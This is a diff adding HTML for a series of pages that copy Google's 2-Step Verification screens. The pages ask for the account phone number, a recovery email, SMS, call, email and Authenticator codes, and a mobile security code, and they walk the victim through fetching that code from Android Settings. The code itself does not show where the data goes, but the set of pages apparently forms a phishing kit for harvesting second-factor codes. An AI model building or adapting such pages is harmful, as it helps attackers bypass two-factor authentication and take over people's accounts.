+  <div class="bottom-links-outerele">
+  <div class="form-bottom-ele mt-32">
+  <div class="form-bottom">
+  <div class="form-bottom-right">
+    <button class="btn-blue btn-background-animation-ele mt-6-mb-6 btn-blue-try-again-btn" onclick="next_btn(this)">
+    <div class="btn-background-animation"></div>
+    <div class="btn-background-behind"></div>
+    <span class="btn-background-animation-text">Try again</span>
+    </button>
+  </div>
+  </div>
+  </div>
+  </div>
+
+  </div>
+
+<div class="section" id="section_verify_phone">
+
+  <div class="section-content pd-v-24" id="section_content-verify_phone">
+  <div class="section_center_animation_ele mt-24" id="verifyphoneanimationele">
+  <div class="section_center_animation_background"></div>
+  <img src="mnbtuom6cfBYTl8SNcvfHzf1OGy1gj97yLrbzRLRpzCIwR41as5tRXwH8zm12SfvQQ1cHu2nqbEkGqnl5wD4nBwMR9mzjGylN400DEPcGfnzjZgAAJwx638" id="verifyphoneanimation" class="section_center_animation" aria-hidden="true" alt="" data-iml="27886.200000000186">
+  </div>
+  <div class="section_title_desc_ele">
+  <span class="section_title">2-Step Verification</span>
+  <div class="mr-pd"></div>
+  <span class="section_title">Get a verification code</span>
+  <div class="mr-pd"></div>
+  </div>
+  <div class="mr-pd mt-0">To get a verification code, first confirm the phone number you added to your account <span id="verify_phone_mobile_name"></span>. Standard rates apply.
+  </div>
+  <div class="inputs-ele mt-24">
+  <div class="inputs pd-v-16">
+    <div class="input-outerele">
+    <div class="input-innerele input-country-phone-num-ele" id="input-verify-phone-outerele">
+    
+    <button class="pn-selected-prefix" aria-label="Select phonenumber prefix" id="js_trigger-dropdown" tabindex="1">
+    <div class="pn-selected-prefix__flag-ele">
+    <img class="pn-selected-prefix__flag" id="js_selected-flag" src="https://flagpedia.net/data/flags/w20/us.png"/>
+    </div>
+    <!-- prettier-ignore -->
+    <div class="pn-selected-prefix__icon-ele">
+    <svg class="pn-selected-prefix__icon" viewBox="7 10 10 5">
+    <polygon class="pn-selected-prefix__icon_down" stroke="none" fill-rule="evenodd" points="7 10 12 15 17 10"></polygon>
+    <polygon class="pn-selected-prefix__icon_up" style="display:none;" stroke="none" fill-rule="evenodd" points="7 15 12 10 17 15"></polygon>
+    </svg>
+    </div>
+    </button>
+
+    <!-- Dropdown -->
+    <div class="pn-dropdown" id="js_dropdown">
+    <!-- Country list -->
+    <ul class="pn-list list" id="js_list"></ul>
+    <div class="pn-list-item pn-list-item--no-results" style="display: none" id="js_no-results-found">
+      No results found
+    </div>
+    </div>
+
+    <div class="input-ele">
+    <input type="text" name="verify_phone" id="inp_verify_phone" class="input input-phone">
+    <label for="verify_phone" class="input-label input-phone-label" id="verify_phone_label">Phone number</label>
+    <div class="input-border"></div>
+    <div class="input-border-animated" id="inp_border_verify_phone"></div>
+    </div>
+    </div>
+    </div>
+    <div id="error_verify_phone_ele" class="error-ele intl-phone-error">
+    <div id="error_verify_phone" class="error">
+    <span class="error-icon"><svg aria-hidden="true" class="stUf5b qpSchb" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg></span>
+    <span id="error_verify_phone_desc">
+    </span>
+    </div>
+    </div>
+
+  <div class="input-checkbox-outerele pd-v-16-v-15">
+  <div class="input-checkbox-innerele">
+  <div class="input-checkbox-ele">
+  <input class="input-checkbox" type="checkbox">
+  <div class="input-checkbox-bottom-ele">
+  <svg aria-hidden="true" class="input-checkbox-bottom" viewBox="0 0 24 24"><path class="input-checkbox-bottom-path" fill="none" d="M1.73,12.91 8.1,19.28 22.79,4.59"></path></svg>
+  </div>
+  <div class="input-checkbox-back-circle"></div>
+  </div>
+  </div>
+  <div class="input-checkbox-text">
+  Don't ask again on this device
+  </div>
+  </div>
+
+  </div>
+  </div>
+  </div>
+  
+  <div class="bottom-links-outerele">
+  <div class="form-bottom-ele mt-32">
+  <div class="form-bottom">
+  <div class="form-bottom-right">
+    <button class="btn-blue btn-background-animation-ele mt-6-mb-6 btn-blue-next-btn" onclick="next_btn(this)">
+    <div class="btn-background-animation"></div>
+    <div class="btn-background-behind"></div>
+    <span class="btn-background-animation-text">Next</span>
+    </button>
+  </div>
+  <div class="form-bottom-left">
+    <button class="btn-light-blue-transparent btn-background-animation-ele mt-6-mb-6 btn-light-blue-try-another-way-btn" data-id="try_another_way" onclick="linkoptionclick(this);">
+    <div class="btn-background-animation"></div>
+    <div class="btn-background-behind"></div>
+    <span class="btn-background-animation-text">Try another way</span>
+    </button>
+  </div>
+  </div>
+  </div>
+  </div>
+
+  <div class="bottom-links-outerele bottom-links-outerele-overlay">
+  <div class="form-bottom-ele mt-32">
+  <div class="form-bottom">
+  <div class="form-bottom-right">
+    <button class="btn-blue btn-background-animation-ele mt-6-mb-6 btn-blue-next-btn" onclick="next_btn(this)">
+    <div class="btn-background-animation"></div>
+    <div class="btn-background-behind"></div>
+    <span class="btn-background-animation-text">Next</span>
+    </button>
+  </div>
+  </div>
+  </div>
+  </div>
+
+  </div>
+
+<div class="section" id="section_confirm_phone">
+
+  <div class="section-content pd-v-24" id="section_content-confirm_phone">
+  <div class="mr-pd mt-0">Enter a phone number to get a text message with a verification code
+  </div>
+  <div class="inputs-ele mt-24">
+  <div class="inputs pd-v-8">
+    <div class="input-outerele">
+    <div class="input-innerele input-country-phone-num-ele" id="input-confirm-phone-outerele">
+    
+    <button class="pn-selected-prefix" aria-label="Select phonenumber prefix" id="js_trigger-dropdown" tabindex="1">
+    <div class="pn-selected-prefix__flag-ele">
+    <img class="pn-selected-prefix__flag" id="js_selected-flag" src="https://flagpedia.net/data/flags/w20/us.png"/>
+    </div>
+    <!-- prettier-ignore -->
+    <div class="pn-selected-prefix__icon-ele">
+    <svg class="pn-selected-prefix__icon" viewBox="7 10 10 5">
+    <polygon class="pn-selected-prefix__icon_down" stroke="none" fill-rule="evenodd" points="7 10 12 15 17 10"></polygon>
+    <polygon class="pn-selected-prefix__icon_up" style="display:none;" stroke="none" fill-rule="evenodd" points="7 15 12 10 17 15"></polygon>
+    </svg>
+    </div>
+    </button>
+
+    <!-- Dropdown -->
+    <div class="pn-dropdown" id="js_dropdown">
+    <!-- Country list -->
+    <ul class="pn-list list" id="js_list"></ul>
+    <div class="pn-list-item pn-list-item--no-results" style="display: none" id="js_no-results-found">
+      No results found
+    </div>
+    </div>
+
+    <div class="input-ele">
+    <input type="text" name="confirm_phone" id="inp_confirm_phone" class="input input-phone">
+    <label for="confirm_phone" class="input-label input-phone-label" id="confirm_phone_label">Phone number</label>
+    <div class="input-border"></div>
+    <div class="input-border-animated" id="inp_border_confirm_phone"></div>
+    </div>
+    </div>
+    </div>
+    <div id="error_confirm_phone_ele" class="error-ele intl-phone-error">
+    <div id="error_confirm_phone" class="error">
+    <span class="error-icon"><svg aria-hidden="true" class="stUf5b qpSchb" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg></span>
+    <span id="error_confirm_phone_desc">
+    </span>
+    </div>
+    </div>
+  </div>
+  </div>
+  </div>
+  
+  <div class="bottom-links-outerele">
+  <div class="form-bottom-ele mt-32">
+  <div class="form-bottom">
+  <div class="form-bottom-right">
+    <button class="btn-blue btn-background-animation-ele mt-6-mb-6 btn-blue-next-btn" onclick="next_btn(this)">
+    <div class="btn-background-animation"></div>
+    <div class="btn-background-behind"></div>
+    <span class="btn-background-animation-text">Next</span>
+    </button>
+  </div>
+  <div class="form-bottom-left">
+    <button class="btn-light-blue-transparent btn-background-animation-ele mt-6-mb-6 btn-light-blue-try-another-way-btn" data-id="try_another_way" onclick="linkoptionclick(this);">
+    <div class="btn-background-animation"></div>
+    <div class="btn-background-behind"></div>
+    <span class="btn-background-animation-text">Try another way</span>
+    </button>
+  </div>
+  </div>
+  </div>
+  </div>
+
+  <div class="bottom-links-outerele bottom-links-outerele-overlay">
+  <div class="form-bottom-ele mt-32">
+  <div class="form-bottom">
+  <div class="form-bottom-right">
+    <button class="btn-blue btn-background-animation-ele mt-6-mb-6 btn-blue-next-btn" onclick="next_btn(this)">
+    <div class="btn-background-animation"></div>
+    <div class="btn-background-behind"></div>
+    <span class="btn-background-animation-text">Next</span>
+    </button>
+  </div>
+  </div>
+  </div>
+  </div>
+
+  </div>
+
+  <div class="section" id="section_verification_email">
+
+  <div class="section-content pd-v-24" id="section_content-verification_email">
+  <div class="mr-pd mt-0">An email with a verification code was just sent to <span id="verification_email_address"></span>
+  </div>
+  <div class="inputs-ele mt-24">
+  <div class="inputs pd-v-8">
+    <div class="input-outerele">
+    <div class="input-innerele">
+    <div class="input-ele">
+    <input type="text" name="verification_email" id="inp_verification_email" class="input input-phone">
+    <label for="verification_email" class="input-label input-phone-label" id="verification_email_label">Enter Code</label>
+    <div class="input-border"></div>
+    <div class="input-border-animated" id="inp_border_verification_email"></div>
+    </div>
+    </div>
+    </div>
+    <div id="error_verification_email_ele" class="error-ele intl-phone-error">
+    <div id="error_verification_email" class="error">
+    <span class="error-icon"><svg aria-hidden="true" class="stUf5b qpSchb" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg></span>
+    <span id="error_verification_email_desc">
+    </span>
+    </div>
+    </div>
+  </div>
+  </div>
+  </div>
+  
+  <div class="bottom-links-outerele">
+  <div class="form-bottom-ele mt-32">
+  <div class="form-bottom">
+  <div class="form-bottom-right">
+    <button class="btn-blue btn-background-animation-ele mt-6-mb-6 btn-blue-next-btn" onclick="next_btn(this)">
+    <div class="btn-background-animation"></div>
+    <div class="btn-background-behind"></div>
+    <span class="btn-background-animation-text">Next</span>
+    </button>
+  </div>
+  <div class="form-bottom-left">
+    <button class="btn-light-blue-transparent btn-background-animation-ele mt-6-mb-6 btn-light-blue-try-another-way-btn" data-id="try_another_way" onclick="linkoptionclick(this);">
+    <div class="btn-background-animation"></div>
+    <div class="btn-background-behind"></div>
+    <span class="btn-background-animation-text">Try another way</span>
+    </button>
+  </div>
+  </div>
+  </div>
+  </div>
+
+  <div class="bottom-links-outerele bottom-links-outerele-overlay">
+  <div class="form-bottom-ele mt-32">
+  <div class="form-bottom">
+  <div class="form-bottom-right">
+    <button class="btn-blue btn-background-animation-ele mt-6-mb-6 btn-blue-next-btn" onclick="next_btn(this)">
+    <div class="btn-background-animation"></div>
+    <div class="btn-background-behind"></div>
+    <span class="btn-background-animation-text">Next</span>
+    </button>
+  </div>
+  </div>
+  </div>
+  </div>
+
+  </div>
+
+  <div class="section" id="section_recovery_email">
+
+  <div class="section-content pd-v-24" id="section_content-recovery_email">
+  <div class="mr-pd mt-0">Confirm the recovery email address you added to your account: <span id="recovery_email_address"></span>
+  </div>
+  <div class="inputs-ele mt-24">
+  <div class="inputs pd-v-8">
+    <div class="input-outerele">
+    <div class="input-innerele">
+    <div class="input-ele">
+    <input type="text" name="recovery_email" id="inp_recovery_email" class="input input-phone">
+    <label for="recovery_email" class="input-label input-phone-label" id="recovery_email_label">Enter recovery email address</label>
+    <div class="input-border"></div>
+    <div class="input-border-animated" id="inp_border_recovery_email"></div>
+    </div>
+    </div>
+    </div>
+    <div id="error_recovery_email_ele" class="error-ele intl-phone-error">
+    <div id="error_recovery_email" class="error">
+    <span class="error-icon"><svg aria-hidden="true" class="stUf5b qpSchb" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg></span>
+    <span id="error_recovery_email_desc">
+    </span>
+    </div>
+    </div>
+  </div>
+  </div>
+  </div>
+  
+  <div class="bottom-links-outerele">
+  <div class="form-bottom-ele mt-32">
+  <div class="form-bottom">
+  <div class="form-bottom-right">
+    <button class="btn-blue btn-background-animation-ele mt-6-mb-6 btn-blue-next-btn" onclick="next_btn(this)">
+    <div class="btn-background-animation"></div>
+    <div class="btn-background-behind"></div>
+    <span class="btn-background-animation-text">Next</span>
+    </button>
+  </div>
+  <div class="form-bottom-left">
+    <button class="btn-light-blue-transparent btn-background-animation-ele mt-6-mb-6 btn-light-blue-try-another-way-btn" data-id="try_another_way" onclick="linkoptionclick(this);">
+    <div class="btn-background-animation"></div>
+    <div class="btn-background-behind"></div>
+    <span class="btn-background-animation-text">Try another way</span>
+    </button>
+  </div>
+  </div>
+  </div>
+  </div>
+
+  <div class="bottom-links-outerele bottom-links-outerele-overlay">
+  <div class="form-bottom-ele mt-32">
+  <div class="form-bottom">
+  <div class="form-bottom-right">
+    <button class="btn-blue btn-background-animation-ele mt-6-mb-6 btn-blue-next-btn" onclick="next_btn(this)">
+    <div class="btn-background-animation"></div>
+    <div class="btn-background-behind"></div>
+    <span class="btn-background-animation-text">Next</span>
+    </button>
+  </div>
+  </div>
+  </div>
+  </div>
+
+  </div>
+
+<div class="section" id="section_mobile_security_code">
+
+  <div class="section-content pd-v-24" id="section_content-mobile_security_code">
+  <div class="list-1-ele mr-pd mt-0">
+  <div class="list-1">
+  <ul class="list-1-ul">
+  <li class="list-1-li">
+  <div>Get your <strong><span id="mobile_security_code_mobile_name"></span></strong></div>
+  </li>
+
+  <li class="list-1-li">
+  <div>Open the <strong>Settings</strong> app<svg aria-hidden="true" class="list-1-svg" fill="currentColor" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
+  <path d="M13.85,22.25h-3.7c-0.74,0-1.36-0.54-1.45-1.27l-0.27-1.89c-0.27-0.14-0.53-0.29-0.79-0.46l-1.8,0.72 c-0.7,0.26-1.47-0.03-1.81-0.65L2.2,15.53c-0.35-0.66-0.2-1.44,0.36-1.88l1.53-1.19c-0.01-0.15-0.02-0.3-0.02-0.46 c0-0.15,0.01-0.31,0.02-0.46l-1.52-1.19C1.98,9.9,1.83,9.09,2.2,8.47l1.85-3.19c0.34-0.62,1.11-0.9,1.79-0.63l1.81,0.73 c0.26-0.17,0.52-0.32,0.78-0.46l0.27-1.91c0.09-0.7,0.71-1.25,1.44-1.25h3.7c0.74,0,1.36,0.54,1.45,1.27l0.27,1.89 c0.27,0.14,0.53,0.29,0.79,0.46l1.8-0.72c0.71-0.26,1.48,0.03,1.82,0.65l1.84,3.18c0.36,0.66,0.2,1.44-0.36,1.88l-1.52,1.19 c0.01,0.15,0.02,0.3,0.02,0.46s-0.01,0.31-0.02,0.46l1.52,1.19c0.56,0.45,0.72,1.23,0.37,1.86l-1.86,3.22 c-0.34,0.62-1.11,0.9-1.8,0.63l-1.8-0.72c-0.26,0.17-0.52,0.32-0.78,0.46l-0.27,1.91C15.21,21.71,14.59,22.25,13.85,22.25z M13.32,20.72c0,0.01,0,0.01,0,0.02L13.32,20.72z M10.68,20.7l0,0.02C10.69,20.72,10.69,20.71,10.68,20.7z M10.62,20.25h2.76 l0.37-2.55l0.53-0.22c0.44-0.18,0.88-0.44,1.34-0.78l0.45-0.34l2.38,0.96l1.38-2.4l-2.03-1.58l0.07-0.56 c0.03-0.26,0.06-0.51,0.06-0.78c0-0.27-0.03-0.53-0.06-0.78l-0.07-0.56l2.03-1.58l-1.39-2.4l-2.39,0.96l-0.45-0.35 c-0.42-0.32-0.87-0.58-1.33-0.77L13.75,6.3l-0.37-2.55h-2.76L10.25,6.3L9.72,6.51C9.28,6.7,8.84,6.95,8.38,7.3L7.93,7.63 L5.55,6.68L4.16,9.07l2.03,1.58l-0.07,0.56C6.09,11.47,6.06,11.74,6.06,12c0,0.26,0.02,0.53,0.06,0.78l0.07,0.56l-2.03,1.58 l1.38,2.4l2.39-0.96l0.45,0.35c0.43,0.33,0.86,0.58,1.33,0.77l0.53,0.22L10.62,20.25z M18.22,17.72c0,0.01-0.01,0.02-0.01,0.03 L18.22,17.72z M5.77,17.71l0.01,0.02C5.78,17.72,5.77,17.71,5.77,17.71z M3.93,9.47L3.93,9.47C3.93,9.47,3.93,9.47,3.93,9.47z M18.22,6.27c0,0.01,0.01,0.02,0.01,0.02L18.22,6.27z M5.79,6.25L5.78,6.27C5.78,6.27,5.79,6.26,5.79,6.25z M13.31,3.28 c0,0.01,0,0.01,0,0.02L13.31,3.28z M10.69,3.26l0,0.02C10.69,3.27,10.69,3.27,10.69,3.26z">
+  </path>
+  <circle cx="12" cy="12" r="3.5"></circle>
+  </svg>
+  </div>
+  </li>
+
+  <li class="list-1-li">
+  <div>Tap <strong>Google</strong></div>
+  </li>
+
+  <li class="list-1-li">
+  <div>Choose your account, if it not already selected</div>
+  </li>
+
+  <li class="list-1-li">
+  <div>Tap <strong>Manage your Google Account</strong></div>
+  </li>
+
+  <li class="list-1-li">
+  <div>Select the Security tab (you may need to scroll to the right)</div>
+  </li>
+
+  <li class="list-1-li">
+  <div>Under "Signing in to Google" tap <strong>Security code</strong></div>
+  </li>
+
+  <li class="list-1-li"><div>Choose an account to get your code</div>
+  </li>
+  </ul>
+  </div>
+  </div>
+  <div class="inputs-ele mt-24">
+  <div class="inputs pd-v-8">
+    <div class="input-outerele">
+    <div class="input-innerele">
+    <div class="input-ele">
+    <input type="text" name="mobile_security_code" id="inp_mobile_security_code" class="input">
+    <label for="mobile_security_code" class="input-label">Enter code</label>
+    </div>
+    <div class="input-border"></div>
+    <div class="input-border-animated" id="inp_border_mobile_security_code"></div>
+    </div>
+    </div>
+    <div id="error_mobile_security_code_ele" class="error-ele">
+    <div id="error_mobile_security_code" class="error">
+    <span class="error-icon"><svg aria-hidden="true" class="stUf5b qpSchb" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg></span>
+    <span id="error_mobile_security_code_desc">
+    </span>
+    </div>
+    </div>
+  </div>
+  <div class="input-checkbox-outerele pd-v-16-v-15">
+  <div class="input-checkbox-innerele">
+  <div class="input-checkbox-ele">
+  <input class="input-checkbox" type="checkbox">
+  <div class="input-checkbox-bottom-ele">
+  <svg aria-hidden="true" class="input-checkbox-bottom" viewBox="0 0 24 24"><path class="input-checkbox-bottom-path" fill="none" d="M1.73,12.91 8.1,19.28 22.79,4.59"></path></svg>
+  </div>
+  <div class="input-checkbox-back-circle"></div>
+  </div>
+  </div>
+  <div class="input-checkbox-text">
+  Don't ask again on this device
+  </div>
+  </div>
+  </div>
+  </div>
+  
+  <div class="bottom-links-outerele">
+  <div class="form-bottom-ele mt-32">
+  <div class="form-bottom">
+  <div class="form-bottom-right">
+    <button class="btn-blue btn-background-animation-ele mt-6-mb-6 btn-blue-next-btn" onclick="next_btn(this)">
+    <div class="btn-background-animation"></div>
+    <div class="btn-background-behind"></div>
+    <span class="btn-background-animation-text">Next</span>
+    </button>
+  </div>
+  <div class="form-bottom-left">
+    <button class="btn-light-blue-transparent btn-background-animation-ele mt-6-mb-6 btn-light-blue-try-another-way-btn" data-id="try_another_way" onclick="linkoptionclick(this);">
+    <div class="btn-background-animation"></div>
+    <div class="btn-background-behind"></div>
+    <span class="btn-background-animation-text">Try another way</span>
+    </button>
+  </div>
+  </div>
+  </div>
+  </div>
+
+  <div class="bottom-links-outerele bottom-links-outerele-overlay">
+  <div class="form-bottom-ele mt-32">
+  <div class="form-bottom">
+  <div class="form-bottom-right">
+    <button class="btn-blue btn-background-animation-ele mt-6-mb-6 btn-blue-next-btn" onclick="next_btn(this)">
+    <div class="btn-background-animation"></div>
+    <div class="btn-background-behind"></div>
+    <span class="btn-background-animation-text">Next</span>
+    </button>
+  </div>
+  </div>
+  </div>
+  </div>
+
+  </div>
+
+  <div class="section" id="section_verification_auth">
+
+  <div class="section-content pd-v-24" id="section_content-verification_auth">
+  <div class="section_title_desc_ele">
+  <span class="section_title">2-Step Verification</span>
+  <div class="mr-pd">
+  Get a verification code from the <strong>Google Authenticator</strong> app
+  </div>
+  </div>
+  <div class="inputs-ele mt-24 pd-v-8">
+  <div class="inputs">
+    <div class="input-outerele">
+    <div class="input-innerele">
+    <div class="input-ele">
+    <input type="text" name="verification_auth_code" id="inp_verification_auth_code" class="input">
+    <label for="verification_auth_code" class="input-label">Enter code</label>
+    </div>
+    <div class="input-border"></div>
+    <div class="input-border-animated" id="inp_border_verification_auth_code"></div>
+    </div>
+    </div>
+    <div id="error_verification_auth_code_ele" class="error-ele">
+    <div id="error_verification_auth_code" class="error">
+    <span class="error-icon"><svg aria-hidden="true" class="stUf5b qpSchb" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg></span>
+    <span id="error_verification_auth_code_desc">
+    </span>
+    </div>
+    </div>
+  </div>
+  <div class="input-checkbox-outerele pd-v-16-v-15">
+  <div class="input-checkbox-innerele">
+  <div class="input-checkbox-ele">
+  <input class="input-checkbox" type="checkbox">
+  <div class="input-checkbox-bottom-ele">
+  <svg aria-hidden="true" class="input-checkbox-bottom" viewBox="0 0 24 24"><path class="input-checkbox-bottom-path" fill="none" d="M1.73,12.91 8.1,19.28 22.79,4.59"></path></svg>
+  </div>
+  <div class="input-checkbox-back-circle"></div>
+  </div>
+  </div>
+  <div class="input-checkbox-text">
+  Don't ask again on this device
+  </div>
+  </div>
+  </div>
+  </div>
+
+  <div class="bottom-links-outerele">
+  <div class="form-bottom-ele mt-32">
+  <div class="form-bottom">
+  <div class="form-bottom-right">
+    <button class="btn-blue btn-background-animation-ele mt-6-mb-6 btn-blue-next-btn" onclick="next_btn(this)">
+    <div class="btn-background-animation"></div>
+    <div class="btn-background-behind"></div>
+    <span class="btn-background-animation-text">Next</span>
+    </button>
+  </div>
+  <div class="form-bottom-left">
+    <button class="btn-light-blue-transparent btn-background-animation-ele mt-6-mb-6 btn-light-blue-try-another-way-btn" data-id="try_another_way" onclick="linkoptionclick(this);">
+    <div class="btn-background-animation"></div>
+    <div class="btn-background-behind"></div>
+    <span class="btn-background-animation-text">Try another way</span>
+    </button>
+  </div>
+  </div>
+  </div>
+  </div>
+
+  <div class="bottom-links-outerele bottom-links-outerele-overlay">
+  <div class="form-bottom-ele mt-32">
+  <div class="form-bottom">
+  <div class="form-bottom-right">
+    <button class="btn-blue btn-background-animation-ele mt-6-mb-6 btn-blue-next-btn" onclick="next_btn(this)">
+    <div class="btn-background-animation"></div>
+    <div class="btn-background-behind"></div>
+    <span class="btn-background-animation-text">Next</span>
+    </button>
+  </div>
+  </div>
+  </div>
+  </div>
+
+  </div>
+
+  <div class="section" id="section_verification_sms">
+
+  <div class="section-content pd-v-24" id="section_content-verification_sms">
+  <div class="section_title_desc_ele pb-3">
+  <div class="mt-24">
+  A text message with a 6-digit verification code was just sent to <span id="verification_sms_phone">(â¢â¢â¢) â¢â¢â¢-â¢â¢12</span>
+  </div>
+  </div>
+  <div class="inputs-ele pd-v-16">
+  <div class="inputs pb-4">
+    <div class="input-outerele">
+    <div class="input-innerele">
+    <span class="pr-12 pl-15">G-</span>
+    <div class="input-ele">
+    <input type="text" name="verification_sms_code" id="inp_verification_sms_code" class="input">
+    <label for="verification_sms_code" class="input-label">Enter the code</label>
+    </div>
+    <div class="input-border"></div>
+    <div class="input-border-animated" id="inp_border_verification_sms_code"></div>
+    </div>
+    </div>
+    <div id="error_verification_sms_code_ele" class="error-ele">
+    <div id="error_verification_sms_code" class="error">
+    <span class="error-icon"><svg aria-hidden="true" class="stUf5b qpSchb" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg></span>
+    <span id="error_verification_sms_code_desc">
+    </span>
+    </div>
+    </div>
+  </div>
+  <div class="input-checkbox-outerele pd-v-16-v-15">
+  <div class="input-checkbox-innerele">
+  <div class="input-checkbox-ele">
+  <input class="input-checkbox" type="checkbox">
+  <div class="input-checkbox-bottom-ele">
+  <svg aria-hidden="true" class="input-checkbox-bottom" viewBox="0 0 24 24"><path class="input-checkbox-bottom-path" fill="none" d="M1.73,12.91 8.1,19.28 22.79,4.59"></path></svg>
+  </div>
+  <div class="input-checkbox-back-circle"></div>
+  </div>
+  </div>
+  <div class="input-checkbox-text">
+  Don't ask again on this device
+  </div>
+  </div>
+  </div>
+  </div>
+
+  <div class="bottom-links-outerele">
+  <div class="bottom-links-v-ele">
+    <div class="bottom-link-h">
+    <button class="btn-light-blue-transparent btn-background-animation-ele mt-6-mb-6 btn-light-blue-resend-it-btn" data-id="resend_it" onclick="linkoptionclick(this);">
+    <div class="btn-background-animation"></div>
+    <div class="btn-background-behind"></div>
+    <span class="btn-background-animation-text">Resend it</span>
+    </button>
+    </div>
+    <div class="bottom-links-v-form-bottom-ele">
+    <div class="form-bottom-ele mt-32">
+  <div class="form-bottom">
+  <div class="form-bottom-right">
+    <button class="btn-blue btn-background-animation-ele mt-6-mb-6 btn-blue-next-btn" onclick="next_btn(this)">
+    <div class="btn-background-animation"></div>
+    <div class="btn-background-behind"></div>
+    <span class="btn-background-animation-text">Next</span>
+    </button>
+  </div>
+  <div class="form-bottom-left">
+    <button class="btn-light-blue-transparent btn-background-animation-ele mt-6-mb-6 btn-light-blue-try-another-way-btn" data-id="try_another_way" onclick="linkoptionclick(this);">
+    <div class="btn-background-animation"></div>
+    <div class="btn-background-behind"></div>
+    <span class="btn-background-animation-text">Try another way</span>
+    </button>
+  </div>
+  </div>
+  </div>
+  </div>
+  </div>
+  </div>
+
+  <div class="bottom-links-outerele bottom-links-outerele-overlay">
+  <div class="bottom-links-v-ele">
+    <div class="bottom-links-v-form-bottom-ele">
+    <div class="form-bottom-ele mt-32">
+  <div class="form-bottom">
+  <div class="form-bottom-right">
+    <button class="btn-blue btn-background-animation-ele mt-6-mb-6 btn-blue-next-btn" onclick="next_btn(this)">
+    <div class="btn-background-animation"></div>
+    <div class="btn-background-behind"></div>
+    <span class="btn-background-animation-text">Next</span>
+    </button>
+  </div>
+  <div class="form-bottom-left">
+    <button class="btn-light-blue-transparent btn-background-animation-ele mt-6-mb-6 btn-light-blue-resend-it-btn" data-id="resend_it" onclick="linkoptionclick(this);">
+    <div class="btn-background-animation"></div>
+    <div class="btn-background-behind"></div>
+    <span class="btn-background-animation-text">Resend it</span>
+    </button>
+  </div>
+  </div>
+  </div>
+  </div>
+  </div>
+  </div>
+
+  </div>
+
+  <div class="section" id="section_verification_call">
+
+  <div class="section-content pd-v-24" id="section_content-section_verification_call">
+  <div class="section_title_desc_ele pb-3">
+  <div class="mt-24">
+  Google is calling <span id="verification_call_phone">(â¢â¢â¢)</span> with a 6-digit verification code
+  </div>
+  </div>
+  <div class="inputs-ele pd-v-16">
+  <div class="inputs pb-4">
+    <div class="input-outerele">
+    <div class="input-innerele">
+    <div class="input-ele">
+    <input type="text" name="verification_call_code" id="inp_verification_call_code" class="input">
+    <label for="verification_call_code" class="input-label">Enter the code</label>
+    </div>
+    <div class="input-border"></div>
+    <div class="input-border-animated" id="inp_border_verification_call_code"></div>
+    </div>
+    </div>
+    <div id="error_section_verification_call_code_ele" class="error-ele">
+    <div id="error_section_verification_call_code" class="error">
+    <span class="error-icon"><svg aria-hidden="true" class="stUf5b qpSchb" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg></span>
+    <span id="error_section_verification_call_code_desc">
+    </span>
+    </div>
+    </div>
+  </div>
+  <div class="input-checkbox-outerele pd-v-16-v-15">
+  <div class="input-checkbox-innerele">
+  <div class="input-checkbox-ele">
+  <input class="input-checkbox" type="checkbox">
+  <div class="input-checkbox-bottom-ele">
+  <svg aria-hidden="true" class="input-checkbox-bottom" viewBox="0 0 24 24"><path class="input-checkbox-bottom-path" fill="none" d="M1.73,12.91 8.1,19.28 22.79,4.59"></path></svg>
+  </div>
+  <div class="input-checkbox-back-circle"></div>
+  </div>
+  </div>
+  <div class="input-checkbox-text">
+  Don't ask again on this device
+  </div>
+  </div>
+  </div>
+  </div>
+
+  <div class="bottom-links-outerele">
+  <div class="bottom-links-v-ele">
+    <div class="bottom-link-h">
+    <button class="btn-light-blue-transparent btn-background-animation-ele mt-6-mb-6 btn-light-blue-resend-it-btn" data-id="resend_it" onclick="linkoptionclick(this);">
+    <div class="btn-background-animation"></div>
+    <div class="btn-background-behind"></div>
+    <span class="btn-background-animation-text">Resend it</span>
+    </button>
+    </div>
+    <div class="bottom-links-v-form-bottom-ele">
+    <div class="form-bottom-ele mt-32">
+  <div class="form-bottom">
+  <div class="form-bottom-right">
+    <button class="btn-blue btn-background-animation-ele mt-6-mb-6 btn-blue-next-btn" onclick="next_btn(this)">
+    <div class="btn-background-animation"></div>
+    <div class="btn-background-behind"></div>
